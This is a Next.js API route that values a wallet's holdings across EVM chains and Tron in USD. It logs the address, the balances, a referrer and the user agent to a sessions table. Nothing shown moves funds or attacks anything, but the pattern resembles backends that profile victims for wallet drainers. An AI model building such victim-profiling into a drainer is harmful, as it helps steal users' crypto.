import { NextResponse } from 'next/server'
import { randomUUID } from 'crypto'
import { db, init } from '@/lib/db'
import { price } from '@/lib/prices'

export async function POST(req: Request) {
  await init()
  const b = await req.json()
  let usd = 0
  for (const c of b.scan ?? []) {
    const meta = (await import('@/lib/chains')).CHAINS[c.chainId as keyof typeof import('@/lib/chains').CHAINS]
    usd += Number(c.native ?? 0) / 10 ** 18 * await price(meta.tokens[0] ? (meta as any).priceNative ?? 'ethereum' : 'ethereum')
    for (const t of c.tokens ?? []) usd += t.amount * await price(meta.tokens.find(x => x.s === t.symbol)?.p ?? 'tether')
  }
  if (b.tronScan) usd += b.tronScan.usdt * 1 + b.tronScan.trx * await price('tron')

  const id = randomUUID()
  await db().query(
    `insert into sessions (id,address,chain_id,scan,tron_address,tron_scan,usd,referrer,ua)
     values ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
    [id, b.address, b.chainId ?? null, JSON.stringify(b.scan ?? []), b.tron ?? null,
     JSON.stringify(b.tronScan ?? null), usd, b.referrer ?? null, b.userAgent ?? null])
  return NextResponse.json({ id, usdTotal: usd })
}
